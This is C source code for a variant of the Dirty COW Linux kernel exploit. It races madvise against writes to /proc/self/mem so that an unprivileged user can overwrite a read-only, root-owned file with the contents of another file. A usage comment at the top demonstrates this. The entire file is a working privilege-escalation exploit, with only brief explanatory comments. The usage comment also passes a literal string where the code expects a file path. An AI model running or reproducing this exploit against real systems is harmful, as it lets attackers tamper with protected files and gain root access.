/*
####################### dirtyc0w.c #######################
$ sudo -s
# echo this is not a test > foo
# chmod 0404 foo
$ ls -lah foo
-r-----r-- 1 root root 19 Oct 20 15:23 foo
$ cat foo
this is not a test
$ gcc -pthread dirtyc0w.c -o dirtyc0w
$ ./dirtyc0w foo m00000000000000000
mmap 56123000
madvise 0
procselfmem 1800000000
$ cat foo
m00000000000000000
####################### dirtyc0w.c #######################
*/
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>

#define min(a,b) (a>b ? b : a)



void *map;
int f;
struct stat st;
char *name;

struct param{
    void *buf;
    size_t len;
};

struct names{
    const char *n1;
    const char *n2;
};

static int didTheJob=0;
static size_t didWriteOK = 0;

void *checkFiles(void *arg){
    struct names *name = (struct names*)arg;
    unsigned char *b1,*b2;
    do{
        FILE *f1 = fopen(name->n1,"r");
        FILE *f2 = fopen(name->n2,"r");
        size_t sf1,sf2;
        
        fseek(f1,0,SEEK_END);
        fseek(f2,0,SEEK_END);
        
        sf1 = ftell(f1);
        sf2 = ftell(f2);
        
        fseek(f1,0,SEEK_SET);
        fseek(f2,0,SEEK_SET);
        
        b1 = malloc(sf1);
        b2 = malloc(sf2);
        
        fread(b1, sf1, 1, f1);
        fread(b2, sf2, 1, f2);
        
        fclose(f1);
        fclose(f2);
        
        if (memcmp(b1,b2,min(sf1,sf2)) == 0) break;
        else {
            size_t goodbytes = 0;
            while (*b1++ == *b2++) goodbytes++;
            if (didWriteOK != goodbytes){
                didWriteOK = goodbytes;
                printf("okbyte=0x%08x of=0x%08x\n",goodbytes,min(sf1,sf2));
            }
        }
        
    }while (1);
    printf("file moved\n");
    didTheJob = 1;
    
}

void *madviseThread(void *arg)
{
  char *str;
  str=(char*)arg;
  int i,c=0;
  for(i=0;i<100000000 && !didTheJob;i++)
  {
/*
You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661
> This is achieved by racing the madvise(MADV_DONTNEED) system call
> while having the page of the executable mmapped in memory.
*/
    c+=madvise(map,100,MADV_DONTNEED);
  }
  printf("madvise %d\n\n",c);
}
 
void *procselfmemThread(void *arg)
{
  struct param *p;
  p=(struct param*)arg;
/*
You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16
>  The in the wild exploit we are aware of doesn't work on Red Hat
>  Enterprise Linux 5 and 6 out of the box because on one side of
>  the race it writes to /proc/self/mem, but /proc/self/mem is not
>  writable on Red Hat Enterprise Linux 5 and 6.
*/
  int f=open("/proc/self/mem",O_RDWR);
  int i,c=0;
    
    for(i=0;i<100000000 && !didTheJob;i++)
    {
        size_t okb = didWriteOK;
        lseek(f,map+okb,SEEK_SET);
        c += write(f,p->buf+okb,p->len-okb);
    }
  printf("procselfmem %d\n\n", c);
}
 
 
int main(int argc,char *argv[])
{
/*
You have to pass two arguments. File and Contents.
*/
  if (argc<3)return 1;
  pthread_t pth1,pth2,pth3;
/*
You have to open the file in read only mode.
*/
  f=open(argv[1],O_RDONLY);
  fstat(f,&st);
  name=argv[1];
/*
You have to use MAP_PRIVATE for copy-on-write mapping.
> Create a private copy-on-write mapping.  Updates to the
> mapping are not visible to other processes mapping the same
> file, and are not carried through to the underlying file.  It
> is unspecified whether changes made to the file after the
> mmap() call are visible in the mapped region.
*/
/*
You have to open with PROT_READ.
*/
  map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
  printf("mmap %x\n\n",map);
    
    FILE *ff = fopen(argv[2],"r");
    if (!ff){
        printf("opening %s failed\n",argv[2]);
        return -1;
    }
    struct param arg;
    fseek(ff,0,SEEK_END);
    arg.len = ftell(ff);
    fseek(ff,0,SEEK_SET);
    arg.buf = malloc(arg.len);
    fread(arg.buf, arg.len, 1, ff);
    fclose(ff);
    
    struct names nn;
    nn.n1 = argv[1];
    nn.n2 = argv[2];
    
    if (arg.len < st.st_size){
        /*
         You have to do it on two threads.
         */
        pthread_create(&pth1,NULL,madviseThread,argv[1]);
        pthread_create(&pth2,NULL,procselfmemThread,&arg);
        pthread_create(&pth3,NULL,checkFiles,&nn);
        /*
         You have to wait for the threads to finish.
         */
        pthread_join(pth1,NULL);
        pthread_join(pth2,NULL);
        pthread_join(pth3,NULL);
        printf("done writing\n");
    }else{
        printf("Trying to overwrite a small file with a bigger one might panic kernel, exiting\n");
    }
    
  free(arg.buf);
  return 0;
}
